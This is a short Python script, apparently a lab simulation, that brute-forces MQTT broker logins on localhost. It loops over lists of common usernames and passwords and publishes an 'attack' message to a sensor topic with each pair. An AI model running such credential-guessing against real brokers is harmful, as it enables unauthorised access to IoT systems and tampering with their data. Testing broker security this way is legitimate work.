# mqtt_bruteforce_sim.py
from paho.mqtt import client as mqtt_client
import time

BROKER='127.0.0.1'
PORT=1883
USERNAMES = ['admin','root','user','test']
PASSWORDS = ['1234','password','admin','mqtt','']
topic="sensors/temp"

def try_connect(user, pwd):
    try:
        c = mqtt_client.Client()
        c.username_pw_set(user, pwd)
        c.connect(BROKER, PORT, 5)
        c.loop_start()
        # attempt to publish (even if connect returns, may be auth fail on some brokers)
        c.publish(topic, "attack")
        c.loop_stop()
        c.disconnect()
        print("Tried", user, pwd)
    except Exception as e:
        print("Error", user, pwd, e)

if __name__ == "__main__":
    for u in USERNAMES:
        for p in PASSWORDS:
            try_connect(u,p)
            time.sleep(0.1)
